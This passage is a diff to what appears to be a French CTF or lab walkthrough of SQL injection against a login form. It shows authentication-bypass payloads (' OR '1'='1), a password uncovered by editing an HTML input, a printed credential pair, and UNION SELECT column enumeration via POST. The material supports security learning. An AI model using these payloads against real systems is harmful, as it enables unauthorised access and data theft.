@@ -110,6 +110,53 @@ On obtient un accès au compte user1 :
 
 ![Pasted image 20230118143835](https://user-images.githubusercontent.com/122984033/213187815-f1fdc674-08df-4376-a86e-a1cd3565457c.png)
 
+Si on va se connecter à l'aide de :
+```sql
+admin
+admin' OR '1'='1
+```
+
+On retrouve un mot de passe sous forme de html en clair :
+
+![Pasted image 20230118145103](https://user-images.githubusercontent.com/122984033/213196271-9a34707d-034c-4099-8e03-15b39aec072d.png)
+
+
+En changant le type de balise input par "text" nous pouvons retrouver le valeur du mot de passe en clair sur la partie html :
+
+![Pasted image 20230118145305](https://user-images.githubusercontent.com/122984033/213196437-ccf79250-17d1-4560-92b6-ad848f0ceb93.png)
+
+**Credentials**
+```
+user1:TYsgv75zgtq
+```
+On essaie de se connecter avec ces identifiants, rien ne se passe.
+
+On continue d'essayer d'exploiter la faille SQL dans le formulaire avec ce compte cette fois-ci en injectant :
+```sql
+user1
+TYsgv75zgtq' OR '1'='1
+```
+
+On détermine le nombre de colonnes en injectant le payload avec une requête POST :
+```sql
+login=user1&password=TYsgv75zgtq' UNION SELECT null  --
+```
+
+Erreur, il n'y a pas qu'une colonne.
+
+![Pasted image 20230118151849](https://user-images.githubusercontent.com/122984033/213196745-3c7158c3-3b9d-4c47-9821-e9140e3c7a76.png)
+
+On ajoute un autre null pour déterminer si il y a 2 colonnes :
+```sql
+login=user1&password=TYsgv75zgtq' UNION SELECT null,null --
+```
+
+Nous avons bien deux colonnes :
+
+![Pasted image 20230118152054](https://user-images.githubusercontent.com/122984033/213196853-b5b1540f-8657-444a-bace-8d4e45875e15.png)
+
+
+
 
 
 
